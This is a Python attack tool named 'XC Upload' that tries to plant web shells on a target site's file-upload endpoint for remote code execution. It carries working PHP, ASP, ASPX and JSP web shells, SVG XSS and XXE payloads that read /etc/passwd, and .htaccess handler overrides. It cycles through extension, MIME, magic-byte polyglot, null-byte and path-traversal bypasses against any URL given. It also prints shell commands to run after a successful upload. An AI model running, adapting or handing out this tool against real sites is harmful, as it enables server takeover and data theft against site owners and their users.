#!/usr/bin/env python3
"""XC Upload — File Upload Bypass Tester"""

import sys, ssl, os, re, time, uuid, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse
import email.mime.multipart

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{M}
╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗
║ ║╠═╝║  ║ ║╠═╣ ║║
╚═╝╩  ╩═╝╚═╝╩ ╩═╩╝  {R}→ RCE{RST}
{DIM}File Upload Bypass Tester — XC Hub{RST}
"""

WEBSHELL_PHP = b'<?php if(isset($_REQUEST["cmd"])){$cmd=($_REQUEST["cmd"]);system($cmd);}?>'
WEBSHELL_PHP_SHORT = b'<?=`$_GET[0]`?>'
WEBSHELL_PHP_OBFUSC = b"<?php $f='sys'.'tem';$f($_GET['c']);?>"
WEBSHELL_ASP = b'<%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll())%>'
WEBSHELL_ASPX = b'<%@ Page Language="C#"%><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>'
WEBSHELL_JSP = b'<%Runtime rt=Runtime.getRuntime();String[] commands={"/bin/sh","-c",request.getParameter("cmd")};Process proc=rt.exec(commands);java.io.BufferedReader stdInput=new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));String s;while((s=stdInput.readLine())!=null){out.println(s);}%>'

MAGIC_BYTES = {
    'jpg':  b'\xff\xd8\xff\xe0',
    'png':  b'\x89PNG\r\n\x1a\n',
    'gif':  b'GIF89a',
    'pdf':  b'%PDF-1.4',
    'zip':  b'PK\x03\x04',
    'bmp':  b'BM',
    'webp': b'RIFF',
    'tiff': b'II*\x00',
}

# Extension bypass variants
PHP_EXTENSIONS = [
    '.php', '.php2', '.php3', '.php4', '.php5', '.php6', '.php7',
    '.phtml', '.pht', '.phps', '.phar', '.pgif', '.shtml',
    '.PHP', '.PhP', '.pHp', '.PHp', '.Php',
    '.php.jpg', '.php.png', '.php.gif', '.php.jpeg',
    '.php%00.jpg', '.php\x00.jpg', '.php.bak',
    '.php.', '.php/', '.php.....',
    '.phtml.jpg', '.phar.jpg',
]

ASP_EXTENSIONS = [
    '.asp', '.aspx', '.asa', '.asax', '.ascx', '.ashx', '.asmx',
    '.asp;.jpg', '.asp%00.jpg',
    '.ASP', '.ASPX', '.AsP', '.aSpX',
]

JSP_EXTENSIONS = [
    '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
    '.JSP', '.Jsp', '.jSp',
    '.jsp.jpg', '.jsp%00.jpg',
]

CONTENT_TYPES = [
    'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
    'image/webp', 'image/svg+xml', 'image/x-icon',
    'application/octet-stream', 'text/plain',
    'multipart/form-data', 'application/zip',
]

XSS_SVG = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert(document.domain)</script>
</svg>'''

XXE_SVG = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="20" fill="red">&xxe;</text>
</svg>'''

XXE_XML = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''

POLYGLOT_GIF_PHP = MAGIC_BYTES['gif'] + b'\n' + WEBSHELL_PHP

def build_multipart(field_name, filename, content, content_type):
    boundary = f'----WebKitFormBoundary{uuid.uuid4().hex[:16]}'
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f'Content-Type: {content_type}\r\n\r\n'
    ).encode() + content + f'\r\n--{boundary}--\r\n'.encode()
    return body, f'multipart/form-data; boundary={boundary}'

def upload(url, field, filename, content, content_type, extra_headers=None, timeout=10):
    body, ct_header = build_multipart(field, filename, content, content_type)
    h = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': '*/*',
        'Content-Type': ct_header,
        'Content-Length': str(len(body)),
    }
    if extra_headers:
        h.update(extra_headers)
    req = Request(url, data=body, headers=h, method='POST')
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(req, timeout=timeout, context=ctx) as r:
            resp = r.read(65536).decode('utf-8', errors='ignore')
            return r.status, resp
    except HTTPError as e:
        try: resp = e.read(4096).decode('utf-8', errors='ignore')
        except: resp = ''
        return e.code, resp
    except Exception as e:
        return None, str(e)

def check_upload_response(status, body, filename):
    indicators = [
        filename, filename.split('.')[0],
        'success', 'uploaded', 'upload', 'saved', 'file',
        '/uploads/', '/upload/', '/files/', '/media/', '/static/',
    ]
    url_pattern = r'(https?://[^\s"\'<>]+|/[^\s"\'<>]+\.\w+)'
    found_url = re.findall(url_pattern, body)
    is_success = status and status in (200, 201, 302) and any(ind in body.lower() for ind in indicators[:6])
    return is_success, found_url

def test_ext_bypass(url, field):
    print(f"\n{BOLD}{B}━━━ EXTENSION BYPASS ━━━{RST}")
    print(f"  Upload field: {W}{field}{RST}")
    for ext in PHP_EXTENSIONS:
        fname = f'xcshell{ext}'
        status, body = upload(url, field, fname, WEBSHELL_PHP, 'image/jpeg')
        success, found_urls = check_upload_response(status, body, fname)
        sym = f'{R}★{RST}' if success else DIM+'~'+RST
        print(f"  [{sym}] [{status}] {fname}")
        if success:
            print(f"       {Y}Possibly uploaded! Found URLs: {found_urls[:3]}{RST}")
        time.sleep(0.2)

def test_mime_bypass(url, field):
    print(f"\n{BOLD}{B}━━━ MIME TYPE BYPASS ━━━{RST}")
    for ct in CONTENT_TYPES:
        fname = 'xcshell.php'
        status, body = upload(url, field, fname, WEBSHELL_PHP, ct)
        success, found_urls = check_upload_response(status, body, fname)
        sym = f'{R}★{RST}' if success else DIM+'~'+RST
        print(f"  [{sym}] [{status}] Content-Type: {ct}")
        if success:
            print(f"       {Y}Possibly uploaded! {found_urls[:2]}{RST}")
        time.sleep(0.15)

def test_magic_bypass(url, field):
    print(f"\n{BOLD}{B}━━━ MAGIC BYTES + PHP (Polyglot) ━━━{RST}")
    tests = [
        ('GIF + PHP',      f'xcshell.php',      MAGIC_BYTES['gif'] + WEBSHELL_PHP,       'image/gif'),
        ('PNG + PHP',      f'xcshell.php',      MAGIC_BYTES['png'] + WEBSHELL_PHP,       'image/png'),
        ('GIF89a shell',   f'xcshell.php.gif',  MAGIC_BYTES['gif'] + WEBSHELL_PHP,       'image/gif'),
        ('GIF89a phtml',   f'xcshell.phtml',    MAGIC_BYTES['gif'] + WEBSHELL_PHP,       'image/gif'),
        ('GIF89a phar',    f'xcshell.phar',     MAGIC_BYTES['gif'] + WEBSHELL_PHP,       'image/gif'),
        ('PHP polyglot',   f'xcshell.php.jpg',  MAGIC_BYTES['jpg'] + b'\n' + WEBSHELL_PHP, 'image/jpeg'),
    ]
    for label, fname, content, ct in tests:
        status, body = upload(url, field, fname, content, ct)
        success, found_urls = check_upload_response(status, body, fname.split('.')[0])
        sym = f'{R}★{RST}' if success else DIM+'~'+RST
        print(f"  [{sym}] [{status}] {label} → {fname}")
        if success:
            print(f"       {Y}{found_urls[:2]}{RST}")
        time.sleep(0.2)

def test_svg_xss(url, field):
    print(f"\n{BOLD}{B}━━━ SVG XSS / XXE ━━━{RST}")
    tests = [
        ('SVG XSS',       'xcxss.svg',  XSS_SVG,  'image/svg+xml'),
        ('SVG XXE',       'xcxxe.svg',  XXE_SVG,  'image/svg+xml'),
        ('XML XXE',       'xcxxe.xml',  XXE_XML,  'text/xml'),
        ('SVG as PNG',    'xcxss.png',  XSS_SVG,  'image/png'),
        ('SVG as JPEG',   'xcxss.jpg',  XSS_SVG,  'image/jpeg'),
    ]
    for label, fname, content, ct in tests:
        status, body = upload(url, field, fname, content, ct)
        success, found_urls = check_upload_response(status, body, fname.split('.')[0])
        sym = f'{R}★{RST}' if success else DIM+'~'+RST
        print(f"  [{sym}] [{status}] {label}")
        if success:
            print(f"       {Y}Uploaded! Try loading the file URL for XSS/XXE trigger.{RST}")
        time.sleep(0.2)

def test_dotfile_bypass(url, field):
    print(f"\n{BOLD}{B}━━━ FILENAME TRICKS ━━━{RST}")
    tests = [
        ('.htaccess rewrite',  '.htaccess',             b'AddType application/x-httpd-php .jpg\n',      'text/plain'),
        ('.htaccess exec',     '.htaccess',             b'Options +ExecCGI\nAddHandler cgi-script .jpg\n', 'text/plain'),
        ('Null byte',          'xcshell.php\x00.jpg',  WEBSHELL_PHP,  'image/jpeg'),
        ('Trailing dot',       'xcshell.php.',          WEBSHELL_PHP,  'image/jpeg'),
        ('Trailing space',     'xcshell.php ',          WEBSHELL_PHP,  'image/jpeg'),
        ('Double ext',         'xcshell.jpg.php',       WEBSHELL_PHP,  'image/jpeg'),
        ('Path traversal',     '../xcshell.php',        WEBSHELL_PHP,  'image/jpeg'),
        ('Absolute path',      '/var/www/html/xc.php',  WEBSHELL_PHP,  'image/jpeg'),
    ]
    for label, fname, content, ct in tests:
        status, body = upload(url, field, fname, content, ct)
        success, found_urls = check_upload_response(status, body, 'xcshell')
        sym = f'{R}★{RST}' if success else DIM+'~'+RST
        print(f"  [{sym}] [{status}] {label}")
        if success:
            print(f"       {Y}Possibly accepted! Check response for file path.{RST}")
        time.sleep(0.2)

def generate_shells():
    print(f"\n{BOLD}{B}━━━ WEBSHELL REFERENCE ━━━{RST}")
    shells = [
        ('PHP minimal',     'xcshell.php',   WEBSHELL_PHP),
        ('PHP short',       'xcs.php',       WEBSHELL_PHP_SHORT),
        ('PHP obfuscated',  'xcob.php',      WEBSHELL_PHP_OBFUSC),
        ('ASP',             'xcshell.asp',   WEBSHELL_ASP),
        ('ASPX',            'xcshell.aspx',  WEBSHELL_ASPX),
        ('JSP',             'xcshell.jsp',   WEBSHELL_JSP),
    ]
    for label, fname, content in shells:
        print(f"\n  {Y}{label}{RST} → {W}{fname}{RST}")
        print(f"  {DIM}{content[:100].decode('utf-8','ignore')}...{RST}")
    print(f"\n  {C}Usage after upload:{RST}")
    print(f"  {DIM}https://site.com/uploads/xcshell.php?cmd=id{RST}")
    print(f"  {DIM}https://site.com/uploads/xcshell.php?cmd=cat+/etc/passwd{RST}")
    print(f"  {DIM}https://site.com/uploads/xcshell.asp?cmd=whoami{RST}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC File Upload Bypass Tester')
    parser.add_argument('url', help='Upload endpoint URL')
    parser.add_argument('--field', default='file', help='Form field name (default: file)')
    parser.add_argument('--ext', action='store_true', help='Extension bypass tests')
    parser.add_argument('--mime', action='store_true', help='MIME type bypass tests')
    parser.add_argument('--magic', action='store_true', help='Magic bytes polyglot tests')
    parser.add_argument('--svg', action='store_true', help='SVG XSS/XXE tests')
    parser.add_argument('--dotfile', action='store_true', help='Filename trick tests (.htaccess, null byte, etc)')
    parser.add_argument('--shells', action='store_true', help='Show webshell code (no upload)')
    parser.add_argument('--full', action='store_true', help='Run all tests')
    args = parser.parse_args()

    if args.shells:
        generate_shells()
        return

    print(f"{BOLD}Target:{RST}     {W}{args.url}{RST}")
    print(f"{BOLD}Field name:{RST} {W}{args.field}{RST}\n")

    if args.ext or args.full:
        test_ext_bypass(args.url, args.field)
    if args.mime or args.full:
        test_mime_bypass(args.url, args.field)
    if args.magic or args.full:
        test_magic_bypass(args.url, args.field)
    if args.svg or args.full:
        test_svg_xss(args.url, args.field)
    if args.dotfile or args.full:
        test_dotfile_bypass(args.url, args.field)

    if not any([args.ext, args.mime, args.magic, args.svg, args.dotfile, args.full, args.shells]):
        print(f"Options:\n  --ext      extension bypass\n  --mime     MIME type bypass\n  --magic    polyglot magic bytes\n  --svg      SVG XSS/XXE\n  --dotfile  .htaccess + filename tricks\n  --shells   show webshell code\n  --full     everything\n")
        print(f"Example:\n  python3 upload.py https://site.com/upload --field file --full\n  python3 upload.py --shells\n")

if __name__ == '__main__':
    main()
